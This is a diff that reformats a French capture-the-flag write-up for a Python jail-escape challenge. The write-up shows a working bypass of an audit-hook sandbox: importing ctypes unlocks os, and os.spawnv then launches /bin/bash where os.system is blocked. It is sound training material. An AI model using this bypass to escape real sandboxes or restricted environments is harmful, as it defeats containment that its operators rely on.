@@ -1,34 +1,42 @@
 # Why not a Sandbox ?
 
 ## intitulé
-Votre but est d'appeler la fonction print_flag pour afficher le flag.
+> Votre but est d'appeler la fonction print_flag pour afficher le flag.
 
 ## Analyse
 Ce challenge est un classique des ctfs, il s'agit d'essayer de s'échapper d'une "jail" python : certaines fonctions sont accessibles, d'autres non. Il faut généralement essayer d'executer une action interdite comme d'appeler un shell.
 
 On va commencer par voir ce qu'on peut faire. 
-```>>> import os
+```python
+>>> import os
 Exception ignored in audit hook:
 Exception: Action interdite
-Exception: Module non autorisé```
+Exception: Module non autorisé
+```
 
 Les imports semblent interdits. Mais, curieusement pas tous :
-```>>> import io
+```python
+>>> import io
 >>> import posix
->>> import ctypes```
+>>> import ctypes
+```
 
 Et encore plus curieusement, l'import de la lib "os" après avoir importé ctypes est tout d'un coup autorisée :
-```>>> import os```
+```python
+>>> import os
+```
 
 Evidement l'appel à la commande system est interdite, ça serait trop simple :
-```>>> os.system("/bin/bash")
+```python
+>>> os.system("/bin/bash")
 Traceback (most recent call last):
   File "<stdin>", line 1, in <module>
 Exception: Action interdite
 ```
 
 mais pas spawnv :
-```os.spawnv(file="/bin/bash", args=["/bin/bash"], mode="w")
+```python
+os.spawnv(file="/bin/bash", args=["/bin/bash"], mode="w")
 >>> bash: cannot set terminal process group (5128): Inappropriate ioctl for device
 bash: no job control in this shell
 ctf@whynotasandbox:/app$ ls -al
